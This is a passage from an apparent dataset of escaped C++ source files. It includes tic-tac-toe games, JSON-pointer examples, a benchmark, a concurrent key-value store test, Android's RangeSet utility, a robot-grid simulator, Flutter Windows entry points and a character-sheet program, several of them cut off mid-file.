continue;\r\n        }\r\n        drawBoard();\r\n\r\n        player_won = winner();\r\n\r\n        if (player_won == 1) {\r\n            cout << \"Player 1 wins!\" << endl;\r\n            break;\r\n        }\r\n        if (player_won == 2) {\r\n            cout << \"Player 2 wins!\" << endl;\r\n            break;\r\n        }\r\n\r\n        if (isDraw()) {\r\n            cout << \"It's a draw!\" << endl;\r\n            break;\r\n        }\r\n\r\n        swap_player_and_marker();\r\n    }\r\n}\r\n\r\nint main() {\r\n    game();\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <nlohmann/json.hpp>\n\nusing json = nlohmann::json;\n\nint main()\n{\n    // different JSON Pointers\n    json::json_pointer ptr1(\"\");\n    json::json_pointer ptr2(\"/foo\");\n    json::json_pointer ptr3(\"/foo/0\");\n    json::json_pointer ptr4(\"/\");\n    json::json_pointer ptr5(\"/a~1b\");\n    json::json_pointer ptr6(\"/c%d\");\n    json::json_pointer ptr7(\"/e^f\");\n    json::json_pointer ptr8(\"/g|h\");\n    json::json_pointer ptr9(\"/i\\\\j\");\n    json::json_pointer ptr10(\"/k\\\"l\");\n    json::json_pointer ptr11(\"/ \");\n    json::json_pointer ptr12(\"/m~0n\");\n\n    std::cout << \"\\\"\" << ptr1.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr2.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr3.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr4.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr5.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr6.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr7.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr8.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr9.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr10.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr11.to_string() << \"\\\"\\n\"\n              << \"\\\"\" << ptr12.to_string() << \"\\\"\" << std::endl;\n}\n",
    "#include <bits/stdc++.h>\n#define ll long long\n#define fmax 1003\nusing namespace std;\n\nll flag;\nll n, w;\nll a[fmax][fmax];\nll f[fmax][fmax];\n\n// di chuy\u1ec3n 4 chi\u1ec1u \nvoid maxWeight(){\n    f[0][0] = a[0][0];\n    for(ll i = 1; i < n; i++)\n        f[0][i] = min (f[0][i - 1], a[0][i]);\n    for(ll i = 1; i < n; i++)\n        f[i][0] = min (f[i - 1][0], a[i][0]);\n    for(ll i = 1; i < n; i++)\n        for(ll j = 1; j < n; j++)\n            f[i][j] = min (a[i][j], max (f[i - 1][j], f[i][j - 1]));\n    cout << f[n - 1][n - 1];\n}\n\nvoid minDanger(){\n    a[0][0] < w ? f[0][0] = 1 : f[0][0] = 0;\n    for(ll i = 1; i < n; i++)\n        a[0][i] < w ? f[0][i] = f[0][i - 1] + 1 : f[0][i] = f[0][i - 1];\n    for(ll i = 1; i < n; i++)\n        a[i][0] < w ? f[i][0] = f[i - 1][0] + 1 : f[i][0] = f[i - 1][0];\n    for(ll i = 1; i < n; i++)\n        for(ll j = 1; j < n; j++)\n            a[i][j] < w ? f[i][j] = min (f[i - 1][j], f[i][j - 1]) + 1 : f[i][j] = min (f[i - 1][j], f[i][j - 1]);\n    cout << f[n - 1][n - 1];\n}\n\nint main(){\n    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);\n    cin >> flag;\n\n    if(flag == 1){\n        cin >> n >> w;\n        for(ll i = 0; i < n; i++)\n            for(ll j = 0; j < n; j++)\n                cin >> a[i][j];\n        minDanger();\n    }else{\n        cin >> n;\n        for(ll i = 0; i < n; i++)\n            for(ll j = 0; j < n; j++)\n                cin >> a[i][j];\n        maxWeight();\n    }\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <chrono>\r\n#include <vector>\r\n#include <random>\r\n#include <algorithm>\r\n#include <numeric>\r\n#include <functional>\r\n\r\n// Function to prevent compiler optimization (MSVC compatible)\r\ntemplate<typename T>\r\nvoid do_not_optimize(T const& value) {\r\n    volatile const T* volatile unused = &value;\r\n    (void)unused;\r\n}\r\n\r\nint add(int x) { \r\n    return x + 1; \r\n}\r\n\r\nint apply(int x, int f(int)) { \r\n    return f(x); \r\n}\r\n\r\nint g(int x) { \r\n    return apply(x, add); \r\n}\r\n\r\n// Function to generate random data\r\nstd::vector<int> generate_random_data(size_t size) {\r\n    std::random_device rd;\r\n    std::mt19937 gen(rd());\r\n    std::uniform_int_distribution<> dis(1, 1000000);\r\n\r\n    std::vector<int> data(size);\r\n    std::generate(data.begin(), data.end(), [&]() { return dis(gen); });\r\n    return data;\r\n}\r\n\r\n// Benchmark function\r\ntemplate<typename Func>\r\ndouble benchmark(Func f, const std::vector<int>& data, size_t iterations) {\r\n    std::vector<double> times;\r\n    times.reserve(iterations);\r\n\r\n    for (size_t i = 0; i < iterations; ++i) {\r\n        auto start = std::chrono::high_resolution_clock::now();\r\n        \r\n        long long sum = 0;\r\n        for (int x : data) {\r\n            sum += f(x);\r\n            do_not_optimize(sum);\r\n        }\r\n        \r\n        auto end = std::chrono::high_resolution_clock::now();\r\n        std::chrono::duration<double> elapsed = end - start;\r\n        times.push_back(elapsed.count());\r\n    }\r\n\r\n    // Remove outliers (top and bottom 10%)\r\n    size_t outliers = iterations / 10;\r\n    std::sort(times.begin(), times.end());\r\n    times.erase(times.begin(), times.begin() + outliers);\r\n    times.erase(times.end() - outliers, times.end());\r\n\r\n    // Calculate mean\r\n    double mean = std::accumulate(times.begin(), times.end(), 0.0) / times.size();\r\n    return mean;\r\n}\r\n\r\nint main() {\r\n    const size_t data_size = 1000000;\r\n    const size_t iterations = 10;\r\n\r\n    std::vector<int> data = generate_random_data(data_size);\r\n\r\n    double time_add = benchmark(add, data, iterations);\r\n    double time_g = benchmark(g, data, iterations);\r\n\r\n    std::cout << \"Average time for add(): \" << time_add << \" seconds\" << std::endl;\r\n    std::cout << \"Average time for g(): \" << time_g << \" seconds\" << std::endl;\r\n    std::cout << \"Ratio (g/add): \" << time_g / time_add << std::endl;\r\n\r\n    return 0;\r\n}",
    "#include <fstream>\n\n#include \"test_utils/test_utils.hpp\"\n\nusing namespace std;\n// warning: N_THREADS must be < 10 because of hash function\nstatic constexpr size_t N_THREADS = 8;\nstatic constexpr size_t N_KEYS_PER_THREAD = 10'000;\n\nint main(int argc, char* argv[]) {\n  std::ofstream output_file(\"performance-runtime.csv\", std::ios::app);\n  if (!output_file.is_open()) {\n    std::cerr << \"Failed to open output file.\" << std::endl;\n  }\n\n  /*\n    This test evaluates the performance of your ConcurrentKVStore by asserting\n    that the time it takes to service MultiGet and MultiPut requests *decreases*\n    as the number of threads *increases*. We spawn a single thread that executes\n    N_THREADS MultiPut/MultiGet requests sequentially, then spawn N_THREAD\n    threads, each of which executes one request. If you've properly implemented\n    bucket-based locking, the multithreaded operations should finish faster than\n    the single-threaded one. We assert that the multithreaded operations take\n    less than half the amount of time as the single-threaded operations.\n  */\n\n  // Define a KVStore for the single-threaded approach to use, including a\n  // special hash function to partition keys into buckets based on last letter\n  auto single_threaded_store = make_unique<ConcurrentKvStore>(\n      [](const string& key) { return stoi(key.substr(key.size() - 1)); });\n  // Define a KVStore for the multi-threaded approach to use, including a\n  // special hash function to partition keys into buckets based on the last\n  // letter\n  auto multi_threaded_store = make_unique<ConcurrentKvStore>(\n      [](const string& key) { return stoi(key.substr(key.size() - 1)); });\n\n  // Generate map of random keys.\n  // By appending \"i\" to the end of the random key string, we ensure that all of\n  // the keys generated by a call to make_pseudo_rand_str(..., i) end in the\n  // same letter. single_threaded_store & multi_threaded_store's hash functions\n  // distribute keys to buckets based on the key's last letter. So, all of the\n  // keys in a given entry (bucket_to_keys[i]) will be in the same bucket. Also,\n  // since i does not repeat, each entry (bucket_to_keys[i]) will touch a\n  // different bucket from another entry (bucket_to_keys[j]).\n  unordered_map<size_t, vector<string>> buckets_to_keys;\n  for (size_t i = 0; i < N_THREADS; i++) {\n    buckets_to_keys[i] = make_pseudo_rand_str(N_KEYS_PER_THREAD, 32, i);\n  }\n\n  // Define helper that the single thread uses to sequentially MultiPut all of\n  // the keys into the single-threaded-store.\n  auto insert_all = [&]() {\n    for (size_t i = 0; i < N_THREADS; i++) {\n      vector<string> keys = buckets_to_keys[i];\n      string index = to_string(i);\n      // values are a vector of the index (as a string) repeated keys.size() #\n      // of times (so it's the same length as keys)\n      vector<string> values(keys.size(), index);\n      ASSERT(multiput_range(*single_threaded_store, keys, values, 0,\n                            N_KEYS_PER_THREAD, N_KEYS_PER_THREAD));\n    }\n  };\n\n  // Time single threaded multiput\n  auto start = chrono::high_resolution_clock::now();\n  {\n    thread single_thread(insert_all);\n    single_thread.join();\n  }\n  auto end = chrono::high_resolution_clock::now();\n  auto single_threaded_time =\n      chrono::duration_cast<chrono::milliseconds>(end - start);\n\n  output_file << \"single_thread_multiput,\" << single_threaded_time.count()\n              << \",\"\n              << to_throughput(single_threaded_time, N_THREADS,\n                               N_KEYS_PER_THREAD)\n              << \"\\n\";\n\n  // Define helper that threads use to MultiPut the keys into the multi-threaded\n  // store. Note that since each entry in buckets_to_keys touches a single\n  // bucket (that's unique from the other buckets in buckets_to_keys), we are\n  // guaranteed that if you have implemented bucket-based locking correctly,\n  // each MultiPut request can execute *at the same time* on N_THREADS buckets.\n  auto insert_bucket = [&](size_t i) {\n    vector<string> keys = buckets_to_keys[i];\n    string index = to_string(i);\n    vector<string> values(keys.size(), index);\n    ASSERT(multiput_range(*multi_threaded_store, keys, values, 0,\n                          N_KEYS_PER_THREAD, N_KEYS_PER_THREAD));\n  };\n\n  // Time multithreaded multiput\n  start = chrono::high_resolution_clock::now();\n  {\n    vector<thread> threads;\n    for (size_t i = 0; i < N_THREADS; i++) {\n      threads.emplace_back(insert_bucket, i);\n    }\n    for (auto& t : threads) {\n      t.join();\n    }\n  }\n  end = chrono::high_resolution_clock::now();\n  auto multi_threaded_time =\n      chrono::duration_cast<chrono::milliseconds>(end - start);\n\n  output_file << \"multi_thread_multiput,\" << multi_threaded_time.count() << \",\"\n              << to_throughput(multi_threaded_time, N_THREADS,\n                               N_KEYS_PER_THREAD)\n              << \"\\n\";\n\n  // Define helper that the single thread uses to sequentially MultiGet all of\n  // the keys in the single-threaded-store",
    "/*\n * Copyright (C) 2017 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"otautil/rangeset.h\"\n\n#include <limits.h>\n#include <stddef.h>\n\n#include <algorithm>\n#include <string>\n#include <utility>\n#include <vector>\n\n#include <android-base/logging.h>\n#include <android-base/parseint.h>\n#include <android-base/stringprintf.h>\n#include <android-base/strings.h>\n\nRangeSet::RangeSet(std::vector<Range>&& pairs) {\n  blocks_ = 0;\n  if (pairs.empty()) {\n    LOG(ERROR) << \"Invalid number of tokens\";\n    return;\n  }\n\n  for (const auto& range : pairs) {\n    if (!PushBack(range)) {\n      Clear();\n      return;\n    }\n  }\n}\n\nRangeSet RangeSet::Parse(const std::string& range_text) {\n  std::vector<std::string> pieces = android::base::Split(range_text, \",\");\n  if (pieces.size() < 3) {\n    LOG(ERROR) << \"Invalid range text: \" << range_text;\n    return {};\n  }\n\n  size_t num;\n  if (!android::base::ParseUint(pieces[0], &num, static_cast<size_t>(INT_MAX))) {\n    LOG(ERROR) << \"Failed to parse the number of tokens: \" << range_text;\n    return {};\n  }\n  if (num == 0) {\n    LOG(ERROR) << \"Invalid number of tokens: \" << range_text;\n    return {};\n  }\n  if (num % 2 != 0) {\n    LOG(ERROR) << \"Number of tokens must be even: \" << range_text;\n    return {};\n  }\n  if (num != pieces.size() - 1) {\n    LOG(ERROR) << \"Mismatching number of tokens: \" << range_text;\n    return {};\n  }\n\n  std::vector<Range> pairs;\n  for (size_t i = 0; i < num; i += 2) {\n    size_t first;\n    size_t second;\n    if (!android::base::ParseUint(pieces[i + 1], &first, static_cast<size_t>(INT_MAX)) ||\n        !android::base::ParseUint(pieces[i + 2], &second, static_cast<size_t>(INT_MAX))) {\n      return {};\n    }\n    pairs.emplace_back(first, second);\n  }\n  return RangeSet(std::move(pairs));\n}\n\nbool RangeSet::PushBack(Range range) {\n  if (range.first >= range.second) {\n    LOG(ERROR) << \"Empty or negative range: \" << range.first << \", \" << range.second;\n    return false;\n  }\n  size_t sz = range.second - range.first;\n  if (blocks_ >= SIZE_MAX - sz) {\n    LOG(ERROR) << \"RangeSet size overflow\";\n    return false;\n  }\n\n  ranges_.push_back(std::move(range));\n  blocks_ += sz;\n  return true;\n}\n\nvoid RangeSet::Clear() {\n  ranges_.clear();\n  blocks_ = 0;\n}\n\nstd::vector<RangeSet> RangeSet::Split(size_t groups) const {\n  if (ranges_.empty() || groups == 0) return {};\n\n  if (blocks_ < groups) {\n    groups = blocks_;\n  }\n\n  // Evenly distribute blocks, with the first few groups possibly containing one more.\n  size_t mean = blocks_ / groups;\n  std::vector<size_t> blocks_per_group(groups, mean);\n  std::fill_n(blocks_per_group.begin(), blocks_ % groups, mean + 1);\n\n  std::vector<RangeSet> result;\n\n  // Forward iterate Ranges and fill up each group with the desired number of blocks.\n  auto it = ranges_.cbegin();\n  Range range = *it;\n  for (const auto& blocks : blocks_per_group) {\n    RangeSet buffer;\n    size_t needed = blocks;\n    while (needed > 0) {\n      size_t range_blocks = range.second - range.first;\n      if (range_blocks > needed) {\n        // Split the current range and don't advance the iterator.\n        buffer.PushBack({ range.first, range.first + needed });\n        range.first = range.first + needed;\n        break;\n      }\n      buffer.PushBack(range);\n      it++;\n      if (it != ranges_.cend()) {\n        range = *it;\n      }\n      needed -= range_blocks;\n    }\n    result.push_back(std::move(buffer));\n  }\n  return result;\n}\n\nstd::string RangeSet::ToString() const {\n  if (ranges_.empty()) {\n    return \"\";\n  }\n  std::string result = std::to_string(ranges_.size() * 2);\n  for (const auto& [begin, end] : ranges_) {\n    result += android::base::StringPrintf(\",%zu,%zu\", begin, end);\n  }\n\n  return result;\n}\n\n// Get the block number for the i-th (starting from 0) block in the RangeSet.\nsize_t RangeSet::GetBlockNumber(size_t idx) const {\n  CHECK_LT(idx, blocks_) << \"Out of bound index \" << idx << \" (total blocks: \" << blocks_ << \")\";\n\n  for (const auto& [begin, end] : ranges_) {\n    if (idx < end - begin) {\n      return begin + idx;\n    }\n    idx -= (end - begin);\n  }\n\n  CHECK(false) << \"Failed to find block number for index \" << idx;\n  return 0;  // Unreachable, but to make compiler happy.\n}\n\n// RangeSet has half-closed half-open bounds. For example, \"3,5\" contains blocks 3 and 4. So \"3,5\"\n// and \"5,7\" are not overlapped.\nbool RangeSet::Overlaps(const RangeSet& other) const {\n  for (const auto& [begin, end] : ranges_) {\n    for (const auto& [",
    "#include <algorithm>\n#include <cstdint>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <stdexcept>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/un.h>\n\n#include \"runtime.hpp\"\n\n\nBoolean Field::move_robot(bool forward) {\n    prev_cell = cur_cell;\n    bool status = move_from_cell(forward, cur_cell);\n    if (!status) std::cout << \"stuck\" << std::endl;\n    if (cur_cell == exit) throw std::runtime_error(\"YOU WON\");\n    return status;\n}\n\nField::Field (const std::string &string) {\n    \n    std::ifstream fs(string);\n    if (!fs.is_open()) {\n        throw std::runtime_error(\"Error: Unable to open the file.\\n\");\n    }\n\n    std::string token_str;\n    int cur_cell_idx = 0;\n    int depth = 0;\n    int width = 1;\n    m_width = width;\n\n    while (std::getline(fs, token_str)) {\n        std::istringstream strstream(token_str);\n\n        std::string cell_str;\n\n        while (std::getline(strstream, cell_str, ' ')) {\n\n            CellType cur_cell_type;\n            int weight = 0;\n\n            switch (cell_str[0]) {\n                case 'R': \n                    cur_cell = Cell(depth, width);\n                    prev_cell = cur_cell;\n                    break;\n                case 'B':\n                    cur_cell_type = CellType::BOX;\n                    weight = atoi(cell_str.c_str()+1);\n                    break;\n                case 'Q':\n                    cur_cell_type = CellType::EXIT;\n                    exit = Cell(depth, width);\n                    break;\n                case 'E':\n                    cur_cell_type = CellType::EMPTY;\n                    break;\n                case 'W':\n                    cur_cell_type = CellType::WALL;\n                    break;\n            }\n\n            m_cells.push_back(std::pair(Cell(depth, width), BaseCell(cur_cell_type, weight)));\n            width+=2;\n            cur_cell_idx++;\n        }\n        depth++;\n\n        m_width = (m_width >= width) ? m_width : width;\n\n        width = (width%2) ? 0 : 1;\n    }\n\n    m_depth = depth;\n    m_width--;\n\n    fs.close();\n\n    m_socket = socket(AF_UNIX, SOCK_STREAM, 0);\n    struct sockaddr_un server_addr;\n    server_addr.sun_family = AF_UNIX;\n    strcpy(server_addr.sun_path, \"/tmp/sock.sock\");\n    \n    int connection_result = connect(m_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));\n    if (connection_result == -1) {\n        perror(\"Socket does not connected: \");\n        close(m_socket);\n        m_socket = -1;\n    }\n}\n\n\nBoolean Field::right() {\n    int new_dir = (int) direction;\n    if (direction != Orient::NORTH_WEST)\n        direction = (Orient) ++new_dir;\n    else\n        direction = Orient::NORTH;\n\n    return true;\n}\n\nBoolean Field::left() {\n    int new_dir = (int) direction;\n    if (direction != Orient::NORTH)\n        direction = (Orient) --new_dir;\n    else\n        direction = Orient::NORTH_WEST;\n\n    return true;\n}\n\nbool change_coords (const Field &field, Cell &cell_to_move_from, int d, int w) {\n    int new_d = cell_to_move_from.first + d;\n    if (new_d > field.get_depth() || new_d < 0)\n        return false;\n    int new_w = cell_to_move_from.second + w;\n    if (new_d > field.get_width() || new_w < 0)\n        return false;\n\n    cell_to_move_from = Cell(new_d, new_w);\n    return true;\n}\n\nbool move_n(const Field &field, Cell &start_cell) {\n    return change_coords(field, start_cell, -2, 0);\n}\n\nbool move_s(const Field &field, Cell &start_cell) {\n    return change_coords(field, start_cell, 2, 0);\n}\n\nbool move_nw(const Field &field, Cell &start_cell) {\n    return change_coords(field, start_cell, -1, -1);\n}\n\nbool move_ne(const Field &field, Cell &start_cell) {\n    return change_coords(field, start_cell, -1, 1);\n}\n\nbool move_se(const Field &field, Cell &start_cell) {\n    return change_coords(field, start_cell, 1, 1);\n}\n\nbool move_sw(const Field &field, Cell &start_cell) {\n    return change_coords(field, start_cell, 1, -1);\n}\n\n\nbool Field::move_from_cell(bool forward, Cell &start_cell) {\n\n    switch (direction) {\n        case Orient::NORTH:\n            return forward ? move_n(*this, start_cell) \n                            : move_s(*this, start_cell);\n        case Orient::NORTH_EAST:\n            return forward ? move_ne(*this, start_cell) \n                            : move_sw(*this, start_cell);\n        case Orient::SOUTH_EAST:\n            return forward ? move_se(*this, start_cell) \n                            : move_nw(*this, start_cell);\n        case Orient::SOUTH:\n            return forward ? move_s(*this, start_cell) \n                            : move_n(*this, start_cell);\n        case Orient::SOUTH_WEST:\n            return forward ? move_sw(*this, start_cell) \n                            : move_ne(*this, start_cell);\n        case Orient::NORTH_WEST:\n            return forward ? move_nw(*this, start_cell) \n                            : move_se(*this, start_cell);\n    }\n\n    return false;\n}\n\nconst CellType get_cell_type(const Cell &to_find, const Field &field) {\n    for (c",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weatherapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"shopping_list\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\r\nCopyright 2011, Ming-Yu Liu\r\n\r\nAll Rights Reserved \r\n\r\nPermission to use, copy, modify, and distribute this software and \r\nits documentation for any non-commercial purpose is hereby granted \r\nwithout fee, provided that the above copyright notice appear in \r\nall copies and that both that copyright notice and this permission \r\nnotice appear in supporting documentation, and that the name of \r\nthe author not be used in advertising or publicity pertaining to \r\ndistribution of the software without specific, written prior \r\npermission. \r\n\r\nTHE AUTHOR DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE, \r\nINCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR \r\nANY PARTICULAR PURPOSE. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR \r\nANY SPECIAL, INDIRECT OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES \r\nWHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN \r\nAN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING \r\nOUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE. \r\n*/\r\n#include \"MERCOutput.h\"\r\n\r\nvoid MERCOutput::StoreClusteringMap(vector<int> &label,const char *filename)\r\n{\r\n\tstd::ofstream file;\r\n\tfile.open(filename);\r\n\r\n\tfor(int i=0;i<label.size();i++)\r\n\t{\r\n\t\tfile<<label[i]<<endl;\r\n\t}\r\n\tfile.close();\r\n}\r\n\r\n\r\nvector<int> MERCOutput::DisjointSetToLabel(MERCDisjointSet *u)\r\n{\r\n\tint nSegments=0;\r\n\tint segIndex = 0;\r\n\tint nVertices = u->rNumVertices();\r\n\tstd::vector<int> *sarray = new std::vector<int> [nVertices];\r\n\tvector<int> labeling(nVertices);\r\n\r\n\tfor (int k=0; k<nVertices; k++) \r\n\t{\r\n\t  int comp = u->Find(k);\r\n\t  sarray[comp].push_back(k);\r\n\t}\r\n\t\r\n\tfor(int k=0;k<nVertices;k++)\r\n\t{\r\n\t\tif(sarray[k].size() > 0)\r\n\t\t{\r\n\t\t\tnSegments++;\r\n\t\t}\r\n\t}\r\n\r\n\tfor(int k=0;k<nVertices;k++)\r\n\t{\r\n\t\tif(sarray[k].size() > 0)\r\n\t\t{\r\n\t\t\tfor(unsigned int j=0;j<sarray[k].size();j++)\r\n\t\t\t{\r\n\t\t\t\tlabeling[sarray[k][j]] = segIndex;\r\n\t\t\t}\r\n\t\t\tsegIndex++;\r\n\t\t}\r\n\t}\r\n\tdelete [] sarray;\r\n\treturn labeling;\r\n}\r\n",
    "#include <iostream>\n\nconst char xPlayer = 'x';\nconst char oPlayer = 'o';\nconst char empty = ' ';\n\nvoid printBoard(char board[3][3])\n{\n    std::cout << \" \" << board[0][0] << \" | \" << board[0][1] << \" | \" << board[0][2] << std::endl;\n    std::cout << \"---+---+---\" << std::endl;\n    std::cout << \" \" << board[1][0] << \" | \" << board[1][1] << \" | \" << board[1][2] << std::endl;\n    std::cout << \"---+---+---\" << std::endl;\n    std::cout << \" \" << board[2][0] << \" | \" << board[2][1] << \" | \" << board[2][2] << std::endl;\n    std::cout << std::endl;\n}\n\nbool isEnd(char board[3][3])\n{\n    for (int i = 0; i < 3; i++)\n    {\n        for (int z = 0; z < 3; z++)\n        {\n            if (board[i][z] == empty)\n            {\n                return false;\n            }\n        }\n    }\n    return true;\n}\n\nbool didWin(char player, char board[3][3])\n{\n    // check rows\n  \n  if(board[0][0] == player && board[0][1] == player && board[0][2] == player) {\n    return true;\n  }\n  \n  if(board[1][0] == player && board[1][1] == player && board[1][2] == player) {\n    return true;\n  }\n  \n  if(board[2][0] == player && board[2][1] == player && board[2][2] == player) {\n    return true;\n  }\n  \n  // check columns\n  \n  if(board[0][0] == player && board[1][0] == player && board[2][0] == player) {\n    return true;\n  }\n  \n  if(board[0][1] == player && board[1][1] == player && board[2][1] == player) {\n    return true;\n  }\n  \n  if(board[0][2] == player && board[1][2] == player && board[2][2] == player) {\n    return true;\n  }\n  \n  \n  // check diagonal\n  \n  if(board[0][0] == player && board[1][1] == player && board[2][2] == player) {\n    return true;\n  }\n  \n  if(board[0][2] == player && board[1][1] == player && board[2][0] == player) {\n    return true;\n  }\n  \n  return false;\n}\n\nbool isLegalMove(int row, int col, char board[3][3])\n{\n    return row >= 0 && row <= 2 && col >= 0 && col <= 2 && board[row][col] == empty;\n}\n\nint main()\n{\n    // current player is either xPlayer or oPlayer\n    char player = xPlayer; \n\n    // two dimensional array representing the tic tac toe board\n    char board[3][3] = {\n        {empty, empty, empty},\n        {empty, empty, empty},\n        {empty, empty, empty}};\n\n    int row, col;\n    while (true)\n    {\n        // get the move from the current player\n        std::cout << player << \": please select the row: \";\n        std::cin >> row;\n        std::cout << player << \": please select the column: \";\n        std::cin >> col;\n        std::cout << std::endl;\n\n        // if not legal, player lost\n        if (isLegalMove(row, col, board) == false)\n        {\n            std::cout << \"Player \" << player << \" lost due to illegal move :-(\" << std::endl;\n            break;\n        }\n\n        // apply the move to the board\n        board[row][col] = player; \n\n        // draw the board in the console\n        printBoard(board);\n\n        // check if the current player won\n        if (didWin(player, board))\n        {\n            std::cout << \"Player \" << player << \" won!!!\" << std::endl;\n            break;\n        }\n\n        // check if the game is over (tie)\n        if (isEnd(board))\n        {\n            std::cout << \"Game over\" << std::endl;\n            break;\n        }\n\n        // select the next player (if current player is x, select o)\n        if (player == xPlayer)\n            player = oPlayer;\n        else\n            player = xPlayer;\n    }\n}",
    "#include <iostream>\r\n#include <string>\r\n\r\nint main() {\r\n    // Dados do personagem\r\n    std::string predefinidos[40] = {\r\n        \"Nome do Personagem\",\r\n        \"Apelido\",\r\n        \"Lugar de Origem\",\r\n        \"Data de Nascimento\",\r\n        \"Sexo do Personagem\",\r\n        \"Classe Social do Personagem\",\r\n        \"Ocupa\u00e7\u00e3o do Personagem\",\r\n        \"Historia do Personagem\",\r\n        \"Motiva\u00e7\u00e3o do Personagem\",\r\n        \"Aparencia do Personagem\",\r\n\r\n        //Atributos do personagem\r\n        \"Nivel de For\u00e7a do Personagem\",\r\n        \"Destreza do Personagem\",\r\n        \"Resitencia e Sa\u00fade do Personagem\",\r\n        \"Nivel de Inteligencia do Personagem\",\r\n        \"Percep\u00e7\u00e3o e Intui\u00e7\u00e3o do Personagem\",\r\n        \"Carisma do Personagem\",\r\n\r\n        //Habilidades adiquiridas pelo personagem\r\n        \"Habilidades com Armas de Fogo do Personagem\",\r\n        \"Habilidades com Armas Brancas do Personagem\",\r\n        \"Nivel de Atletismo do Personagem\",\r\n        \"Nivel de Furtividade do Personagem\",\r\n        \"Habilidade de Infiltra\u00e7\u00e3o do Personagem\",\r\n        \"Habilidade de Luta do Personagem\",\r\n        \"Habilidade em Tratar Feridas\",\r\n        \"Habilidade de Persuas\u00e3o\",\r\n        \"Habiliade de Usar Tecnologia\",\r\n        \"Habilidade de dirigir veiculos\",\r\n        \"Familiaridade do Personagem com Regras Sociais\",\r\n        \"Linguas que o Personagem fala\",\r\n\r\n        //Implante cibern\u00e9tico\r\n        \"Nome do Implante Cibernetico do Personagem\",\r\n        \"Onde Esta Localizado o Implante no Corpo do Personagem\",\r\n        \"O Que o Implante Faz\",\r\n        \"Quanto Custou o Implante do Personagem em Creditos \",\r\n\r\n        //Armas do jogador\r\n        \"As Armas que o Personagem Possui\",\r\n        \"Armaduras que o Personagem Possui\",\r\n        \"Equipamentos que o personagem possui\",\r\n\r\n        //Custo durante o jogo\r\n        \"Quanto de Creditos o Personagem Possui\",\r\n\r\n        //Informa\u00e7\u00f5es adicionais\r\n        \"A Reputa\u00e7\u00e3o do Personagem\",\r\n        \"A Qual Gaugue o Personagem 